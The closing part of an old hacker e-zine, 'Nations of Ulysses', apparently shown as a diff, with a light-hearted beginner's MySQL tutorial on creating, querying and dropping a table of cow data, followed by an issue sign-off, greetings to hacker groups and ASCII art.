+MySQL is an SQL database server developed by TcX. It can be found at http://www.mysql.com. 
+It has a client library that is public domain for programmers to connect, query and get 
+results from the server. the client named mysql may be used for monitoring and simple 
+updates of your databases.
+use it as mysql -h host -u user -p.
+Note the MySQL accounts are not the same as the systems. A special database is used to 
+hold privilege information.
+To create and use a new database we could do something like this:
+mysql> CREATE DATABASE blah;
+mysql> USE blah
+now we must create a table to hold our data:
+mysql> CREATE table cowinfos (name VARCHAR(15), age INTEGER, weight INTEGER);
+to show the table we created:
+mysql> DESCRIBE cowinfos;
++--------+-------------+------+-----+---------+-------+
+| Field  | Type        | Null | Key | Default | Extra |
++--------+-------------+------+-----+---------+-------+
+| name   | varchar(15) | YES  |     | NULL    |       |
+| age    | int(11)     | YES  |     | NULL    |       |
+| weight | int(11)     | YES  |     | NULL    |       |
++--------+-------------+------+-----+---------+-------+
+3 rows in set (0.16 sec)
+varchar is a datatype which in this case holds upto 15 characters.
+Now lets fill our table up with useful COW INFOS:
+mysql> INSERT INTO cowinfos VALUES
+    -> ('Betsy', 17, 409);
+Query OK, 1 row affected (0.07 sec)
+
+mysql> INSERT INTO cowinfos VALUES
+    -> ('Jethro', 5, 547);
+Query OK, 1 row affected (0.00 sec)
+
+mysql> INSERT INTO cowinfos VALUES
+    -> ('Hambone', 9, 320);
+Query OK, 1 row affected (0.00 sec)
+To dump the tables contents we can do:
+mysql> SELECT * FROM cowinfos;
++---------+------+--------+
+| name    | age  | weight |
++---------+------+--------+
+| Betsy   |   17 |    409 |
+| Jethro  |    5 |    547 |
+| Hambone |    9 |    320 |
++---------+------+--------+
+3 rows in set (0.09 sec)
+now to search for entrys we can do:
+mysql> SELECT * FROM cowinfos WHERE name='Betsy';
++-------+------+--------+
+| name  | age  | weight |
++-------+------+--------+
+| Betsy |   17 |    409 |
++-------+------+--------+
+1 row in set (0.09 sec)
+To get the names of the cows that are under 500 pounds we could do:
+mysql> SELECT name FROM cowinfos WHERE weight <= 500;
++---------+
+| name    |
++---------+
+| Betsy   |
+| Hambone |
++---------+
+2 rows in set (0.00 sec)
+Now that all the cows have been turned into hamburger we do not require this information. 
+We'll do a:
+mysql> DROP table cowinfos;
+mysql> DROP database blah;
+And thats the end of the vital cow information.
+
+Part 2 will be included in issue two of nou...
+
+**********************************************************************************
+
+Well...that's it for this issue of Nations of Ulysses. Please check back in September
+for the second issue. Thanks for your interest and support in this publication.
+
+                                ,_  .--.
+         Special               , ,   _)\/    ;--.
+        Thanks to:     . ' .    \_\-'   |  .'    \
+                      -= * =-   (.-,   /  /       |
+             b4b0      ' .\'    ).  ))/ .'   _/\ /
+              9x           \_   \_  /( /     \ /(
+            #2600          /_\ .--'   `-.    //  \
+         phrozen crew      ||\/        , '._//    |
+            foonet         ||/ /`(_ (_,;`-._/     /
+                           \_.'   )   /`\       .'
+        and everyone else       .' .  |  ;.   /`
+        that's supported       /      |\(  `.(
+        and contributed       |   |/  | `    `
+         to this issue        |   |  /
+                              |   |.'
+                            __/'  
+                         _ .'  _.-`
+                      _.` `.-;`/          CIAO! ;)
+                     /_.-'` / /
+                           | /       
+                          ( /           
+                         /_/
+
